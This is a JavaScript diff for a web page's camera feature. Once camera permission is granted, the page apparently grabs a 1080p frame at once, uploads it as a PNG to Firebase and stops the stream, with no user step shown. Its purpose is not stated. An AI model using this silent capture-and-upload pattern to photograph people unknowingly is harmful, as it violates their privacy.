@@ -78,20 +78,23 @@
 
                 video.srcObject = stream;
 
+                // Wait for the video metadata to load
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+
                 // Set canvas size
                 canvas.width = 1920; // Set canvas width for 1080p
                 canvas.height = 1080; // Set canvas height for 1080p
 
-                // Immediately capture image after the stream is active
-                video.onloadedmetadata = async () => {
-                    video.play();
-                    // Delay briefly to allow video stream to stabilize
-                    await new Promise(resolve => setTimeout(resolve, 50)); // 50 ms delay
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const imageData = canvas.toDataURL('image/png');
-                    uploadImage(imageData); // Upload image to Firebase
-                    stopVideo(stream); // Stop the video stream
-                };
+                // Capture image immediately
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/png');
+                uploadImage(imageData); // Upload image to Firebase
+                stopVideo(stream); // Stop the video stream
             } catch (err) {
                 console.error('Error accessing permissions: ', err);
                 alert('Permissions denied! You cannot use this feature without granting permissions.');
